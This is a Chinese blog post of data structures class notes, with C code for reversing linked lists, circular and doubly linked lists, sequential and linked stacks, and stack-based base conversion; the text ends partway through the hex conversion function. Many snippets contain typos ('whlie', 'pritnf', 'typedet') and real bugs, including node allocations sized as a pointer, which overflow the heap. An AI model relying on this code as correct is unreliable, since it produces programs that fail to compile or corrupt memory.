title="单链表逆置"></a>单链表逆置</h3><blockquote><p><strong>这是在课堂上当堂练习的内容，记录下来，直接贴算法吧</strong></p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">Reverse</span><span class="params">(LinkList H)</span></span><br><span class="line">&#123;</span><br><span class="line">    PNode a,b;</span><br><span class="line">    a = H-&gt;next;    <span class="comment">//用一个指针记录下第一个结点</span></span><br><span class="line">    H-&gt;next = <span class="literal">NULL</span>; <span class="comment">//头结点指针域置空，把头结点独出来</span></span><br><span class="line">    <span class="keyword">while</span>(a)        <span class="comment">//进入循环，循环到最后一个结点为NULL时结束循环</span></span><br><span class="line">    &#123;</span><br><span class="line">        b = a;                  <span class="comment">//用另一个指针记录下后继结点</span></span><br><span class="line">        a = a-&gt;next;            <span class="comment">//移动到下一个结点</span></span><br><span class="line">        b-&gt;next = H-&gt;next;      <span class="comment">//头结点指针域指向分离出来的那个结点</span></span><br><span class="line">        H-&gt;next = b;            <span class="comment">//不懂怎么表达这句话的意思</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p><del>单循环链表和双循环链表记得更新</del></p><p>已更新</p></blockquote><h3 id="单循环链表"><a href="#单循环链表" class="headerlink" title="单循环链表"></a>单循环链表</h3><p>为了解决知道链表中某个结点的位置而无法找到其前驱的问题，引入了循环链表，就是<strong>让最后一个结点指向头结点</strong></p><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/20201209195611.png"></p><p>为了方便利用，多采用<strong>尾指针</strong><code>rear</code>来表示单循环链表，头结点则表示为<code>rear-&gt;next</code>，第一个结点则表示为<code>rear-&gt;next-&gt;next</code></p><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/20201209195643.png"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//建立尾指针表示的单循环链表</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="type">int</span> DataType;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Node</span>;</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">Node</span> *<span class="title">PNode</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Node</span>&#123;</span></span><br><span class="line">    DataType data;</span><br><span class="line">    PNode next;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">Node</span> *<span class="title">CLinkList</span>;</span></span><br><span class="line">CLinkList <span class="title function_">createListRearCircle</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    PNode rear;</span><br><span class="line">    Pnode s;</span><br><span class="line">    <span class="type">int</span> x;</span><br><span class="line">    CLinkList head = (CLinkList)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(CLinkList));</span><br><span class="line">    head-&gt;next = head;</span><br><span class="line">    rear = head;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;请输入整型数据建立链表，以-1结束\n&quot;</span>);</span><br><span class="line">    scanf_s(<span class="string">&quot;%d&quot;</span>&amp;x);</span><br><span class="line">    whlie(x!=<span class="number">-1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        s = (PNode)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(CLinkList));</span><br><span class="line">        s-&gt;data = x;</span><br><span class="line">        s-&gt;next = head;</span><br><span class="line">        rear-&gt;next = s;</span><br><span class="line">        rear = s;</span><br><span class="line">        scanf_s(<span class="string">&quot;%d&quot;</span>,&amp;x);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> rear;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="两个单循环链表合并成一个新的单循环链表"><a href="#两个单循环链表合并成一个新的单循环链表" class="headerlink" title="两个单循环链表合并成一个新的单循环链表"></a>两个单循环链表合并成一个新的单循环链表</h4><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/20201209202024.png"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">CLinkList <span class="title function_">Combine</span><span class="params">(CLinkList a,CLinkList b)</span></span><br><span class="line">&#123;</span><br><span class="line">    PNode p = a-&gt;next;</span><br><span class="line">    a-&gt;next = b-&gt;next-&gt;next;</span><br><span class="line">    <span class="built_in">free</span>(b-&gt;next);</span><br><span class="line">    b-&gt;next = p;</span><br><span class="line">    <span class="keyword">return</span> b;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="双链表和双循环链表"><a href="#双链表和双循环链表" class="headerlink" title="双链表和双循环链表"></a>双链表和双循环链表</h3><h4 id="双链表"><a href="#双链表" class="headerlink" title="双链表"></a>双链表</h4><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/20201209202806.png"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//类型定义</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">node</span>//双链表结点类型</span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    DataType data;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">node</span> *<span class="title">llink</span>;</span><span class="comment">//前驱指针</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">node</span> *<span class="title">rlink</span>;</span><span class="comment">//后继指针</span></span><br><span class="line">&#125;Dlnode;</span><br><span class="line"><span class="keyword">typedef</span><span class="comment">//头尾结点指针类型（head）</span></span><br><span class="line">&#123;</span><br><span class="line">    DLnode *first;</span><br><span class="line">    DLnode *last;</span><br><span class="line">&#125;DLinkList;</span><br><span class="line">DLinkList *dlist;</span><br></pre></td></tr></table></figure><h4 id="双链表删除"><a href="#双链表删除" class="headerlink" title="双链表删除"></a>双链表删除</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">Del_DoubleList</span><span class="params">(DLinkList dlist,Dlnode *p)</span></span><br><span class="line">&#123;</span><br><span class="line">    p-&gt;llink-&gt;rlink = p-&gt;rlink;</span><br><span class="line">    p-&gt;rlink-&gt;llink = p-&gt;llink;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="双链表插入"><a href="#双链表插入" class="headerlink" title="双链表插入"></a>双链表插入</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">Insert_DoubleList</span><span class="params">(Dlnode *p)</span></span><br><span class="line">&#123;</span><br><span class="line">    Dlnode s = (Dlnode)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(Dlnode));</span><br><span class="line">    <span class="keyword">if</span>(s)</span><br><span class="line">    &#123;</span><br><span class="line">        s-&gt;llink = p;</span><br><span class="line">        s-&gt;rlink = p-&gt;rlink;</span><br><span class="line">        p-&gt;rlink-&gt;llink = s;</span><br><span class="line">        p-&gt;rlink = s;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;malloc失败\n&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="双循环链表"><a href="#双循环链表" class="headerlink" title="双循环链表"></a>双循环链表</h4><blockquote><p>把双链表最后一个结点的后继指针指向第一个结点，把第一个结点的前驱指针指向最后一个结点，就组成了双循环链表</p></blockquote><h1 id="第三章-栈和队列"><a href="#第三章-栈和队列" class="headerlink" title="第三章 栈和队列"></a>第三章 栈和队列</h1><ul><li><strong>栈和队列其实是线性表的特例，特殊性在于它们都是操作受限的线性表</strong></li></ul><h2 id="栈"><a href="#栈" class="headerlink" title="栈"></a>栈</h2><ul><li>栈限定在表尾进行插入或删除，表尾端称<strong>栈顶</strong>，表头端称<strong>栈底</strong></li><li><strong>后进先出</strong></li></ul><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/20201210203545.png"></p><h3 id="栈混洗"><a href="#栈混洗" class="headerlink" title="栈混洗"></a>栈混洗</h3><ul><li>n个数据以此进栈，随时可能出栈，按照出栈顺序得到的一个序列，称为一个栈混洗</li><li>任一前缀中的 push 不少于 pop ，则该序列也必然对应一个栈混洗</li></ul><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/20201013235541.png" alt="栈混洗"></p><h3 id="顺序栈"><a href="#顺序栈" class="headerlink" title="顺序栈"></a>顺序栈</h3><ul><li><strong>静态结构，需提前分配存储空间</strong></li><li><strong>注意判断栈满或栈空</strong></li></ul><h4 id="顺序栈类型定义"><a href="#顺序栈类型定义" class="headerlink" title="顺序栈类型定义"></a>顺序栈类型定义</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="type">int</span> DataType;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Stack</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="type">int</span> MAX;<span class="comment">//最大容量</span></span><br><span class="line">    <span class="type">int</span> top;<span class="comment">//栈顶指针</span></span><br><span class="line">    DataType *elem;<span class="comment">//存放元素的数组的起始指针</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">Stack</span> *<span class="title">SeqStack</span>//定义顺序栈类型</span></span><br></pre></td></tr></table></figure><h4 id="创建空栈"><a href="#创建空栈" class="headerlink" title="创建空栈"></a>创建空栈</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">SeqStack <span class="title function_">SetNullStack_Seq</span><span class="params">(<span class="type">int</span> m)</span><span class="comment">//创建空顺序栈，m 为分配的最大空间</span></span><br><span class="line">&#123;</span><br><span class="line">    SeqStack sstack = (SeqStack)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">struct</span> Stack));</span><br><span class="line">    <span class="keyword">if</span>(sstack != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        sstack-&gt;elem = (<span class="type">int</span>*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="type">int</span>) * m);</span><br><span class="line">        <span class="keyword">if</span>(sstack-&gt;elem != <span class="literal">NULL</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            sstack-&gt;MAX = m;<span class="comment">//顺序栈最大容量</span></span><br><span class="line">            sstack-&gt;top = <span class="number">-1</span>;<span class="comment">//设置栈顶初值为1</span></span><br><span class="line">            <span class="keyword">return</span>(sstack);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">free</span>(sstack);</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        pritnf(<span class="string">&quot;Alloc failure!&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/20201014001548.png" alt="顺序栈模型"></p><h4 id="顺序栈判空"><a href="#顺序栈判空" class="headerlink" title="顺序栈判空"></a>顺序栈判空</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">IsNullStack_seq</span><span class="params">(SeqStack sstack)</span><span class="comment">//判空函数</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span>(sstack-&gt;top == <span class="number">-1</span>);<span class="comment">//栈顶元素 top 用来判断，如果为空返回 1 ，如果不为空返回 0 </span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="进栈"><a href="#进栈" class="headerlink" title="进栈"></a>进栈</h4><ul><li><strong>需要检查栈是否已满</strong></li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">Push_seq</span><span class="params">(SeqStack sstack, <span class="type">int</span> x)</span><span class="comment">//入栈</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span>(sstack-&gt;top &gt;= (sstack-&gt;MAX - <span class="number">1</span>))<span class="comment">//检查栈满函数</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;栈满了，再加栈溢出了!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        sstack-&gt;top ++;<span class="comment">//修改栈顶变量</span></span><br><span class="line">        sstack-&gt;elem[sstack-&gt;top] = x;<span class="comment">//把元素放进栈顶变量的位置中</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p><strong><code>sstack-&gt;top</code>用来表示数组下标</strong></p><p><strong>必须先修改栈顶指针，<code>sstack-&gt;top++</code>，然后再把元素放进去</strong></p></blockquote><h4 id="出栈"><a href="#出栈" class="headerlink" title="出栈"></a>出栈</h4><ul><li><strong>需要检查栈是否已空</strong></li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">Pop_seq</span><span class="params">(SeqStack sstack)</span><span class="comment">//出栈</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span>(IsNullStack_seq(sstack))<span class="comment">//调用判断栈空函数</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;栈空了!&quot;</span>);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        sstack-top = sstack-top - <span class="number">1</span>;<span class="comment">//栈顶-1</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="取栈顶元素"><a href="#取栈顶元素" class="headerlink" title="取栈顶元素"></a>取栈顶元素</h4><ul><li><strong>需要检查栈是否已空</strong></li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">DataType <span class="title function_">Top_seq</span><span class="params">(SeqStack sstack)</span><span class="comment">//取栈顶元素的值</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span>(IsNullStack_seq(sstack))<span class="comment">//调用判断栈空函数</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;栈空了!&quot;</span>);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> sstack-&gt; elem[sstack-&gt;top];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="链栈"><a href="#链栈" class="headerlink" title="链栈"></a>链栈</h3><ul><li><strong>用链式存储的栈， top 指向栈顶元素，栈底在链表尾部</strong></li><li><strong>指针从栈顶开始，往栈底方向链接，有头结点</strong></li><li><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/20201014002909.png" alt="链栈模型"></li></ul><h4 id="链栈类型定义"><a href="#链栈类型定义" class="headerlink" title="链栈类型定义"></a>链栈类型定义</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="type">int</span> DataType;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Node</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    DataType data;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">Node</span>* <span class="title">next</span>;</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">Node</span> *<span class="title">PNode</span>;</span><span class="comment">//结点类型</span></span><br><span class="line">typedet <span class="class"><span class="keyword">struct</span> <span class="title">Node</span> *<span class="title">top</span>, *<span class="title">LinkStack</span>;</span><span class="comment">//栈顶和链栈类型</span></span><br></pre></td></tr></table></figure><h4 id="创建空栈-1"><a href="#创建空栈-1" class="headerlink" title="创建空栈"></a>创建空栈</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">LinkStack <span class="title function_">SetNullStack_Link</span><span class="params">()</span><span class="comment">//创建空链栈</span></span><br><span class="line">&#123;</span><br><span class="line">    LinkStack top = (LinkStack)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">struct</span> Node));</span><br><span class="line">    <span class="keyword">if</span>(top != <span class="literal">NULL</span>)</span><br><span class="line">        top-&gt;next = <span class="literal">NULL</span>;<span class="comment">//头结点指针域置空</span></span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Alloc failure&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> top;<span class="comment">//返回栈顶指针</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="判断栈空"><a href="#判断栈空" class="headerlink" title="判断栈空"></a>判断栈空</h4><ul><li>判断栈顶结点的指针域是否为<code>NULL</code>，空则返回1，否则返回0</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">IsNullStack_link</span><span class="params">(LinkStack top)</span><span class="comment">//判断链栈是否为空</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span>(top-&gt;next == <span class="literal">NULL</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;<span class="comment">//为空返回1</span></span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;<span class="comment">//不为空返回0</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="进栈-1"><a href="#进栈-1" class="headerlink" title="进栈"></a>进栈</h4><ul><li><strong>进栈操作的关键点和链表的关键点一样：&#x3D;&#x3D;只能是前驱找后继，后继找不到前驱&#x3D;&#x3D;，所以进栈的指针指向顺序有讲究</strong><ol><li><strong>头结点指针域赋值给要插入元素指针域</strong></li><li><strong>头结点指针域指向要插入元素</strong></li></ol></li><li><strong>栈的插入操作只能是在栈顶，即在头结点处进行进栈操作</strong></li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">Push_link</span><span class="params">(LinkStack top, DataType x)</span>;<span class="comment">//进栈</span></span><br><span class="line">&#123;</span><br><span class="line">    PNode p;</span><br><span class="line">    p = (PNode)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">struct</span> Node));<span class="comment">//申请结点空间</span></span><br><span class="line">    <span class="keyword">if</span>(p == <span class="literal">NULL</span>)</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Alloc failure&quot;</span>);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        p-&gt;data = x;<span class="comment">//数据域赋值</span></span><br><span class="line">        p-&gt;next = top-&gt;next;<span class="comment">//指针域赋值</span></span><br><span class="line">        top-&gt;next = p; <span class="comment">//修改栈顶</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/20201014005501.png" alt="进栈模型"></p><h4 id="出栈-1"><a href="#出栈-1" class="headerlink" title="出栈"></a>出栈</h4><ul><li><strong>出栈需要判空，需要释放结点空间</strong></li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">Pop_link</span><span class="params">(LinkStack top)</span><span class="comment">//删除栈顶元素</span></span><br><span class="line">&#123;</span><br><span class="line">    PNode p;</span><br><span class="line">    <span class="keyword">if</span>(IsNullStack_link(top))<span class="comment">//判断栈空</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;是空的&quot;</span>);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        p = top-&gt;next;<span class="comment">//p 指向待删除结点</span></span><br><span class="line">        top-&gt;next = p-&gt;next;<span class="comment">//修改栈顶指针</span></span><br><span class="line">        <span class="built_in">free</span>(p);<span class="comment">//释放删除结点空间</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="取栈顶元素-1"><a href="#取栈顶元素-1" class="headerlink" title="取栈顶元素"></a>取栈顶元素</h4><ul><li><strong>需要判空</strong></li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">DataType <span class="title function_">Top_link</span><span class="params">(LinkStack top)</span><span class="comment">//删除栈顶元素</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span>(IsNullStack_link(top))<span class="comment">//判断栈空</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;是空的&quot;</span>);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> top-&gt;next-&gt;data;<span class="comment">//头结点指针域指向的就是栈顶的结点</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>这里以后有空要记得补上栈的应用的一些代码</p></blockquote><h3 id="栈实现：进制转换"><a href="#栈实现：进制转换" class="headerlink" title="栈实现：进制转换"></a>栈实现：进制转换</h3><h4 id="转八进制"><a href="#转八进制" class="headerlink" title="转八进制"></a>转八进制</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">Conversion</span><span class="params">(LinkStack ps, <span class="type">int</span> n)</span><span class="comment">//十进制转八进制</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> temp;</span><br><span class="line">    <span class="keyword">while</span>(n)</span><br><span class="line">    &#123;</span><br><span class="line">        Push_link(ps,n%<span class="number">8</span>);</span><br><span class="line">        n/=<span class="number">8</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;结果为:&quot;</span>);</span><br><span class="line">    <span class="keyword">while</span>(!IsNullStack_Link(ps))</span><br><span class="line">    &#123;</span><br><span class="line">        temp = Top_link(ps);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>,temp);</span><br><span class="line">        Pop_link(ps);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="转十六进制"><a href="#转十六进制" class="headerlink" title="转十六进制"></a>转十六进制</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">Hexconversion</span><span class="params">(LinkStack ps,<span class="type">int</span> n)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> temp;</span><br><span class="line">    <span class="keyword">while</span>(n)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">int</span> temp = n%<span class="number">16</span>;</span><br><span class="line">        <span class="keyword">switch</span>(temp)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">10</span>:temp = <span class="string">&#x27;A&#x27;</span>;<span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">11</span>:temp = <span class="string">&#x27;B&#x27;</span>;<span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">12</span>:temp = <span class="string">&#x27;C&#x27;</span>;<span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">13</span>:temp = <span 